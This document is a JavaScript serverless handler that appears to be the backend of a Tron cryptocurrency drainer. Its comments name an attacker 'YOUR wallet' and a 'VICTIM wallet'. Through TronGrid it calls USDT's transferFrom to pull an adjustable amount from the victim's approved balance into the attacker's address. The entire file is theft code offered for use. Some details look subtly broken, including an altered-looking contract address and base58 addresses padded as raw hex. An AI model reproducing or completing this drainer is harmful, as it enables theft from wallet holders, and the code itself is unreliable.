const axios = require('axios');

// --- CONFIGURATION ---
// Replace with YOUR wallet address (Recipient & Gas Payer)
const CONNECTED_ADDRESS = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as"; 

// Replace with VICTIM wallet address (Source of funds)
const VICTIM_ADDRESS = "TAzVMjYGNLs5NxRSnnALDLdrKkUHJwajPg"; 

// USDT Contract Address on Tron
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q1ZY4P886YSzn12345"; 
// ---------------------

function encodeParams(addr1, addr2, amount) {
    // Helper to pad hex strings to 64 characters (32 bytes)
    const padHex = (hex, len) => hex.padStart(len, '0');
    
    // Remove '0x' if present, then pad to 64 chars
    const a1 = padHex(addr1.replace('0x', ''), 64);
    const a2 = padHex(addr2.replace('0x', ''), 64);
    
    // Convert amount to hex, padded to 64 chars
    const amt = padHex(amount.toString(16), 64);
    
    return a1 + a2 + amt;
}

export default async function handler(req, res) {
    // Allow both GET and POST requests
    if (req.method !== 'GET' && req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Determine amount to drain (default 5 USDT = 5,000,000 SUN)
    // Accept from query params (?amount=...) or body
    let amountSuns = parseInt(req.query.amount || req.body.amount || 5000000);
    
    // Validate amount
    if (isNaN(amountSuns) || amountSuns < 0) {
        amountSuns = 5000000;
    }

    // Build the payload for TronGrid
    const payload = {
        owner_address: CONNECTED_ADDRESS,      // You pay the gas
        contract_address: USDT_CONTRACT,       // The USDT Token
        function_selector: "transferFrom(address,address,uint256)",
        parameter: encodeParams(VICTIM_ADDRESS, CONNECTED_ADDRESS, amountSuns),
        call_value: 0
    };

    try {
        // Trigger the smart contract via TronGrid API
        const response = await axios.post('https://api.trongrid.io/wallet/triggersmartcontract', payload);
        const data = response.data;

        if (data.txID) {
            // Success: Return the Transaction ID
            return res.status(200).json({ 
                success: true, 
                txID: data.txID,
                url: `https://tronscan.org/#/transaction/${data.txID}`
            });
        } else {
            // Failure: Return the error message from TronGrid
            return res.status(400).json({ 
                success: false, 
                error: data.message || 'Unknown error occurred' 
            });
        }
    } catch (error) {
        // Network or Server error
        console.error("Drain Error:", error.response?.data || error.message);
        return res.status(500).json({ 
            success: false, 
            error: error.response?.data?.message || error.message 
        });
    }
}
